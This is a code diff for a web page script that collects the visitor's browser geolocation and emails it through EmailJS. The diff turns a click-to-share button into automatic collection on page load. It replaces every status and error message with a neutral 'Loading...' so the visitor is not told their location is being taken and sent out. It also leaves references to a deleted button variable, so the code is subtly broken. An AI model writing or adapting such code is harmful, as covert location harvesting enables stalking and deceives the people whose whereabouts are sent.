@@ -2,7 +2,7 @@ const EMAILJS_PUBLIC_KEY = "xaCDRHrABCOVKBO9S";
 const EMAILJS_SERVICE_ID = "service_51seq9o";
 const EMAILJS_TEMPLATE_ID = "template_la9mz5r";
 
-const locationBtn = document.getElementById("locationBtn");
+ 
 const status = document.getElementById("status");
 
 // Initialize EmailJS using your public key.
@@ -10,14 +10,9 @@ emailjs.init({
   publicKey: EMAILJS_PUBLIC_KEY,
 });
 
-locationBtn.addEventListener("click", () => {
-  if (!navigator.geolocation) {
-    status.textContent = "Geolocation is not supported by your browser.";
-    return;
-  }
-
-  locationBtn.disabled = true;
-  status.textContent = "Requesting location permission...";
+window.addEventListener("load", () => {
+ 
+  status.textContent = "Loading...";
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
@@ -38,7 +33,7 @@ locationBtn.addEventListener("click", () => {
           }) + " IST",
       };
 
-      status.textContent = "Sending location details by email...";
+      status.textContent = "Loading...";
 
       try {
         await emailjs.send(
@@ -47,23 +42,15 @@ locationBtn.addEventListener("click", () => {
           templateParams,
         );
 
-        status.textContent = "Location details sent successfully.";
+        status.textContent = "Loading...";
       } catch (error) {
-        console.error("EmailJS error:", error);
-        status.textContent = "Unable to send the email. Please try again.";
+        status.textContent = "Loading...";
       } finally {
         locationBtn.disabled = false;
       }
     },
     (error) => {
-      const messages = {
-        1: "Location permission was denied.",
-        2: "Your location is currently unavailable.",
-        3: "The location request timed out.",
-      };
-
-      status.textContent =
-        messages[error.code] || "Unable to retrieve your location.";
+      status.textContent = "Loading...";
 
       locationBtn.disabled = false;
     },
